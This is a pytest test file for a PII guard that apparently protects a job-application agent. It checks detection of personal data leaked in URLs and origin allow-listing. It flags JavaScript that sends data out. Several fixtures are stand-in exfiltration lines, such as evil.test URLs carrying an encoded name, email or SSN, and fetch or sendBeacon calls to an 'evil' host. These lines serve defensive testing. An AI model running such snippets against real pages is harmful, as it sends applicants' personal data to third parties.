"""Unit tests for core.pii_guard: which values are personal, and which origins are the job's."""
import pytest

from core.pii_guard import NETWORK_JS, ApplyOrigins, ProtectedData, registrable

PROFILE = {
    "name": "Alex Example", "email": "alex@example.com", "phone": "(415) 555-0123",
    "date_of_birth": "1990-04-07", "ssn": "000-12-3456",
    "address": {"street": "1 Example Way", "city": "Springfield", "state": "Illinois", "zip": "62701",
                "country": "United States of America"},
    "linkedin": "https://www.linkedin.com/in/alex-example",
    "current_role": "Data Engineer", "current_company": "Example Labs",
    "cover_letter": "Dear hiring team, I have spent six years building reliable data pipelines.",
    "work_authorization": "Authorized to work in the US",
}


@pytest.fixture(scope="module")
def pd():
    return ProtectedData(PROFILE, {"account_email": "alex+jobs@example.com"})


@pytest.mark.parametrize("text,kind", [
    ("https://evil.test/?n=Alex%20Example", "name"),
    ("https://evil.test/?n=example,alex", "name"),
    ("https://evil.test/?n=ALEX_EXAMPLE", "name"),
    ("https://evil.test/c?e=alex%2540example.com", "email"),
    ("https://evil.test/c?e=alex%2Bjobs%40example.com", "email"),
    ("https://evil.test/c?p=415.555.0123", "phone"),
    ("https://evil.test/c?d=1990-04-07", "date_of_birth"),
    ("https://evil.test/c?d=04/07/1990", "date_of_birth"),
    ("https://evil.test/c?d=7.4.1990", "date_of_birth"),
    ("https://evil.test/c?d=19900407", "date_of_birth"),
    ("https://evil.test/c?a=1+Example+Way", "address"),
    ("https://evil.test/c?s=000123456", "id_number"),
    ("https://evil.test/c?t=dear%20hiring%20team%2C%20i%20have%20spent%20six", "profile_text"),
    ("https://evil.test/c?l=linkedin.com/in/alex-example", "profile_link"),
], ids=lambda v: v if len(str(v)) < 16 else None)
def test_personal_values_are_found_however_they_are_encoded(pd, text, kind):
    assert kind in pd.url_leaks(text)


@pytest.mark.parametrize("url", [
    "https://boards.greenhouse.io/examplelabs/jobs/4001?gh_src=linkedin",
    "https://jobs.example.com/data-engineer-springfield-illinois",
    "https://example.wd5.myworkdayjobs.com/en-US/careers/job/Springfield/Data-Engineer_R-1990",
    "https://www.linkedin.com/in/alex-example",          # the candidate's own profile is fine to open
    "https://www.google.com/search?q=Example+Labs+data+engineer",
    "https://jobs.example.com/apply?ref=5550199&date=2024-04-07",
])
def test_ordinary_job_urls_are_not_leaks(pd, url):
    assert pd.url_leaks(url) == []


def test_public_categories_are_not_protected(pd):
    assert pd.leaks("Authorized to work in the US") == []
    assert pd.leaks("Data Engineer at Example Labs, Springfield, Illinois 62701") == []


def test_verification_codes_learned_during_the_run_are_protected(pd):
    p = ProtectedData(PROFILE)
    assert p.leaks("code 482913") == []
    p.add("482913", "verification_code")
    assert p.leaks("https://evil.test/?c=482913") == ["verification_code"]


@pytest.mark.parametrize("host,reg", [("boards.greenhouse.io", "greenhouse.io"), ("a.b.example.co.uk", "example.co.uk"),
                                      ("127.0.0.1", "127.0.0.1"), ("localhost", "localhost")])
def test_registrable_domain(host, reg):
    assert registrable(host) == reg


@pytest.mark.parametrize("url,ok", [
    ("https://boards.greenhouse.io/acme/jobs/1", True),            # the job's own host
    ("https://job-boards.greenhouse.io/acme/jobs/1#app", True),    # same registrable domain
    ("https://acme.wd5.myworkdayjobs.com/careers", True),           # a known ATS
    ("https://accounts.google.com/signin", True),                  # SSO, exact host
    ("https://login.microsoftonline.com/common", True),
    ("https://careers.acmerockets.com/apply", True),               # the employer's own domain
    ("https://acme.com/jobs", True),
    ("https://docs.google.com/forms/d/x", False),                  # Google hosts attacker forms too
    ("https://sites.google.com/view/acme-verify", False),
    ("https://acme-rockets-verify.com/id", False),
    ("https://verify-identity.example/", False),
    ("http://localhost:8000/phish", False),
    ("about:blank", False), ("javascript:alert(1)", False), ("", False),
])
def test_application_origins(url, ok):
    o = ApplyOrigins("https://boards.greenhouse.io/acme/jobs/1", "Acme Rockets, Inc.")
    assert o.allows(url) is ok


def test_user_added_apply_domains():
    o = ApplyOrigins("https://www.linkedin.com/jobs/view/1", "Acme", extra=["https://apply.hirepartner.example/x",
                                                                           "*.otherats.example"])
    assert o.allows("https://tenant.hirepartner.example/form")
    assert o.allows("https://x.otherats.example/")
    assert not o.allows("https://hirepartner-verify.example/")


@pytest.mark.parametrize("code,bad", [
    ("document.querySelector('#email').value", False),
    ("el.value = 'x'; el.dispatchEvent(new Event('input'))", False),
    ("fetch('https://evil/'+x)", True), ("navigator.sendBeacon('/c', d)", True),
    ("new Image().src = 'https://evil/?'+d", True), ("location.href='https://evil'", True),
    ("document.forms[0].action = 'https://evil'", True), ("document.forms[0].submit()", True),
    ("f.requestSubmit()", True), ("top.postMessage(d,'*')", True), ("if (location.href == x) {}", False),
])
def test_scripts_that_send_data_are_spotted(code, bad):
    assert bool(NETWORK_JS.search(code)) is bad
